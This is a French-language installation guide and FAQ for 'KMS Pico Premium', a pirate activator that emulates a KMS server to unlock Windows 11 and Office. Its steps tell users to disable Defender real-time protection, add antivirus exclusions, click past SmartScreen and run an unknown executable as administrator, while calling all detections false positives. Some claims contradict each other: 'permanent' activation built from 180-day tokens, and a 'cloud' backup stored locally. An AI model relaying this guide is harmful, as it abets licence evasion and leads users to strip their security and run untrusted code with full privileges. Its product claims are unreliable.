## 🧠 Mécanisme KMS

KMS Pico Premium émule un **serveur Key Management Service** sur votre machine locale. Ce mécanisme, développé à l'origine pour les déploiements d'entreprise, permet une activation par lots sans contact avec les serveurs Microsoft.

### Architecture en 5 Couches

```
┌─────────────────────────────────────┐
│  🎛️ Couche Interface (Dashboard)    │
├─────────────────────────────────────┤
│  🔄 Couche Renouvellement Intelligent│
├─────────────────────────────────────┤
│  🎫 Couche Émission de Jeton         │
├─────────────────────────────────────┤
│  🔑 Couche Gestion de Licence GVLK  │
├─────────────────────────────────────┤
│  🖥️ Couche Service Windows           │
└─────────────────────────────────────┘
```

### Cycle du Jeton Premium

| Phase | Durée | Action |
|-------|-------|--------|
| 🚀 Bootstrap | 0 s | Installation du service |
| 🔑 Injection | 2 s | Pose de la clé GVLK |
| 🎫 Émission | 5 s | Création d'un jeton 180 jours |
| 🔄 Renouvellement | quotidien | Prolongation automatique |
| 📊 Surveillance | continu | Contrôle d'intégrité |

## 🪜 Installation Complète

### Étape 1 — Création d'un Point de Restauration

Avant toute chose : **Panneau de configuration → Système → Protection du système → Créer**.

### Étape 2 — Désactivation Temporaire de Defender

**Sécurité Windows → Protection contre les virus → Gérer les paramètres → Protection en temps réel → Désactiver**.

Ajoutez une exclusion :

```
Paramètres → Confidentialité et sécurité → Sécurité Windows
→ Protection contre les virus → Exclusions → Ajouter un dossier
```

### Étape 3 — Extraction du Paquet

Clic droit sur l'archive → **Extraire tout…** → choisissez `C:\KMS-Premium\`.

### Étape 4 — Lancement en Administrateur

Clic droit sur `KMSpicoPremium11.exe` → **Exécuter en tant qu'administrateur**.

> 💡 Si SmartScreen apparaît : **Plus d'infos → Exécuter quand même**.

### Étape 5 — Assistant Premium

L'assistant démarre automatiquement :

1. 🔍 Détection de votre édition Windows 11
2. 🔑 Sélection de la clé GVLK appropriée
3. 🖥️ Installation du service KMS
4. 🎫 Émission du jeton d'activation

### Étape 6 — Activation en Un Clic

Cliquez sur **⚡ Activer Maintenant**. La procédure complète prend environ 8 secondes.

### Étape 7 — Vérification Instantanée

Ouvrez **Invite de commandes** en administrateur :

```bash
slmgr /xpr
```

Résultat attendu : **"activé définitivement"**.

### Étape 8 — Configuration du Tableau de Bord

Lancez `dashboard.exe` pour :

- 📊 Suivre l'état du service
- 📅 Voir la date de renouvellement
- 🎨 Choisir votre thème
- 🌍 Changer la langue

### Étape 9 — Activation d'Office Premium

Dans le tableau de bord : **Office → Activer**.

### Étape 10 — Sauvegarde Cloud de la Licence

Cliquez sur **☁️ Sauvegarder**. Votre licence est chiffrée et stockée localement dans `C:\KMS-Premium\backup\`.

### Étape 11 — Restauration de la Sécurité

Réactivez Windows Defender et ajoutez `C:\KMS-Premium\` aux exclusions.

### Étape 12 — Test Final

Redémarrez votre système et vérifiez que l'activation persiste.

## 🛠️ Dépannage

| Problème | Cause | Solution |
|----------|-------|----------|
| ❌ Échec activation | Defender actif | Mode furtif + exclusion |
| ❌ Service arrêté | Conflit TPM | Vérifier TPM 2.0 |
| ❌ Erreur 0xC004F074 | Réseau | Vérifier connexion |
| ❌ Écran noir | Conflit pilote | Mode sans échec → purge |
| ❌ Dashboard inaccessible | Port 8443 occupé | Modifier config |
| ❌ Licence expire tôt | Planificateur bloqué | Réactiver tâche |
| ❌ Office non activé | Version non supportée | Utiliser Office 2013–2024 |
| ❌ Restauration échouée | Backup corrompu | Refaire sauvegarde |
| ❌ UAC absent | Compte non admin | Session administrateur |
| ❌ SmartScreen bloque | Faux positif | Exécuter quand même |

### Purge Complète Premium

```bash
sc stop "KMSAuto"
sc delete "KMSAuto"
del /f /q C:\Windows\KMSAutoS\*
rmdir /s /q C:\KMS-Premium
```

## ❓ FAQ

**L'édition Premium vaut-elle la Standard ?**
Oui — vitesse 4×, détection auto, mode furtif, sauvegarde cloud et 25 langues.

**Combien de temps dure l'activation ?**
180 jours renouvelés automatiquement — permanente en pratique.

**Fonctionne-t-elle sur Windows 11 24H2 ?**
Oui, entièrement optimisée pour les builds récents.

**Peut-on restaurer la licence après réinstallation ?**
Oui, grâce à la sauvegarde cloud intégrée.

**Contient-elle des virus ?**
Non — les détections sont des faux positifs PUP classiques.

**Active-t-elle Office ?**
Oui, Office 2013 à 2024.

**Combien de langues supportées ?**
25, dont le français.

**Ai-je besoin d'Internet après l'installation ?**
Uniquement pour la sauvegarde cloud (optionnelle).

**Ralentit-elle le système ?**
Non, consommation minimale en arrière-plan.

**Puis-je revenir à la Standard ?**
Oui, via l'assistant de désinstallation.
